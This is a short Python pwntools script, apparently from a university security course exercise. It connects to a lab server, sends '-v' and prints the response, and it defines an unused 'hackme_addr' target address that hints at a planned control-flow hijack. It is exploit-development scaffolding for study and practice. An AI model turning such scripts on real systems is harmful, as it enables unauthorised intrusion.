from pwn import *

context.log_level = 'debug'
HOST = 'inf226.puffling.no'
PORT = 6102
hackme_addr = 0x401236

io = remote(HOST, PORT)
io.send(b'-v')
io.shutdown('out')

print(str(io.readall(timeout=2), 'ascii', errors='replace'))
io.close()
